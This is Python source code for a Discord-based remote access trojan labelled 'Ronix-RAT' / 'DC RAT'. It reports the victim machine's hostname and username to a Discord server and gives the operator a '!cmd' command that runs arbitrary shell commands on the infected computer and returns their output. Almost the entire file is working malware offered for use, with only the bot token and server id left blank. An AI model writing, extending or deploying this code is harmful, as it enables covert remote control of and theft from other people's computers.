# Author: cybermads
# Discord simple bot rat
# Ronix-RAT bot source code

import discord
from discord.ext import commands
import platform
import os
import subprocess

####################################################################################
token = "" 
id = 1234
####################################################################################

instent = discord.Intents.all()

bot = commands.Bot(command_prefix="!", intents=instent)

@bot.event
async def on_ready():
    # System info
    uname = platform.uname()
    pc = uname.node.lower()
    user = os.getlogin()

    guild = bot.get_guild(id)
    
    # create session
    category = discord.utils.get(guild.categories, name=f'DC RAT | {pc}')
    if not category:
        category = await guild.create_category(f'DC RAT | {pc}')

    session = discord.utils.get(category.channels, name='terminal')
    if not session:
        session = await guild.create_text_channel('terminal', category=category)

        # embed session logs

        embed = discord.Embed(title="", description=f"# DC RAT")
        embed.add_field(name=f"root@{user}:~#", value=pc, inline=False)
        embed.set_footer(text="DC RAT V1")
        await session.send(content='@everyone', embed=embed)

          
    else: # embed Reconnection logs
        embed = discord.Embed(title="", description=f"# RECONNECTION")
        embed.add_field(name=f"root@{user}:~#", value=pc, inline=False)
        embed.set_footer(text="DC RAT V1")
        await session.send(content='@everyone', embed=embed)

# execute command
@bot.command()
async def cmd(ctx, * cmd):
    await ctx.send(f"{subprocess.getoutput(cmd)}")

# ping command
@bot.command()
async def ping(ctx):
    await ctx.send("!pong")

# you can add command
# ex: shutdown /s /t


bot.run(token)
